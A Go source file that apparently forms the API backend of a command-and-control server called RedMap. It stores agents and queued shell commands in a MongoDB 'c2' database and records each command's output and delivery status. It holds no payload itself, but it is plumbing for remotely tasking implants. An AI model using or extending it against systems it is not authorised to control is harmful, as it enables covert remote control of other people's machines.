package api

import (
	"RedMap/config"
	"encoding/json"
	"fmt"
	"log"
	"time"

	"github.com/globalsign/mgo"
	"github.com/globalsign/mgo/bson"
	"github.com/lithammer/shortuuid"
)

type Agent struct {
	ID   bson.ObjectId `bson:"_id,omitempty"`
	Name string
}

type Command struct {
	ID      bson.ObjectId `bson:"_id,omitempty"`
	Command string
	Agent   string
	Status  string
	Cmdid   string
	Output  string
}

//GetSecrets api data
func GetAgents() []byte {
	//query := bson.M{}

	session, err := mgo.Dial("127.0.0.1")
	if err != nil {
		panic(err)
	}

	defer session.Close()

	c := session.DB("c2").C("agents")

	// Query All
	var results []Agent
	err = c.Find(bson.M{}).All(&results)

	if err != nil {
		panic(err)
	}
	fmt.Println("Results All: ", results)

	jsondat, err := json.Marshal(results)
	if err != nil {
		log.Fatal("Cannot encode to JSON ", err)
	}

	return jsondat
}

func GetCommands(agent string) []byte {
	//query := bson.M{}

	session, err := mgo.Dial("127.0.0.1")
	if err != nil {
		panic(err)
	}

	defer session.Close()

	c := session.DB("c2").C("commands")

	// Query All
	var results []Command
	err = c.Find(bson.M{"agent": agent, "status": "0"}).All(&results)

	if err != nil {
		panic(err)
	}
	fmt.Println("Results All: ", results)

	jsondat, err := json.Marshal(results)
	if err != nil {
		log.Fatal("Cannot encode to JSON ", err)
	}

	return jsondat
}

func GetCommandsOut(agent string) []byte {
	//query := bson.M{}

	session, err := mgo.Dial("127.0.0.1")
	if err != nil {
		panic(err)
	}

	defer session.Close()

	c := session.DB("c2").C("commands")

	// Query All
	var results []Command
	err = c.Find(bson.M{"agent": agent, "client_status": "0"}).All(&results)

	if err != nil {
		panic(err)
	}
	fmt.Println("Results All: ", results)

	jsondat, err := json.Marshal(results)
	if err != nil {
		log.Fatal("Cannot encode to JSON ", err)
	}

	return jsondat
}

//Update command read status
func UpdateCMDStatus(id string, output string) {
	//_id, _ := primitive.ObjectIDFromHex(id)
	fmt.Println("Updating")
	fmt.Println(id)
	session, err := mgo.Dial("127.0.0.1")
	if err != nil {
		panic(err)
	}
	defer session.Close()
	c := session.DB("c2").C("commands")
	if err != nil {
		panic(err)
	}
	what := bson.M{"cmdid": id}
	change := bson.M{"$set": bson.M{"status": "1", "output": output}}
	c.Update(what, change)
}

//Update command read status
func UpdateCMDStatusOut(id string) {
	//_id, _ := primitive.ObjectIDFromHex(id)
	fmt.Println("Updating")
	fmt.Println(id)
	session, err := mgo.Dial("127.0.0.1")
	if err != nil {
		panic(err)
	}
	defer session.Close()
	c := session.DB("c2").C("commands")
	if err != nil {
		panic(err)
	}
	what := bson.M{"cmdid": id}
	change := bson.M{"$set": bson.M{"client_status": "1"}}
	c.Update(what, change)
}

//Update command read status
func NewCMD(cmd string) {
	randid := shortuuid.New()
	fmt.Println("sending command")
	fmt.Println(cmd)
	query := bson.M{"agent": "test", "cmdid": randid, "status": "0", "client_status": "0", "command": cmd, "timestamp": time.Now()}
	session, err := mgo.Dial(config.Configuration.MongoEndpoint)
	if err != nil {
		panic(err)
	}
	defer session.Close()
	c := session.DB("c2").C("commands")
	err = c.Insert(query)
	if err != nil {
		panic(err)
	}
}
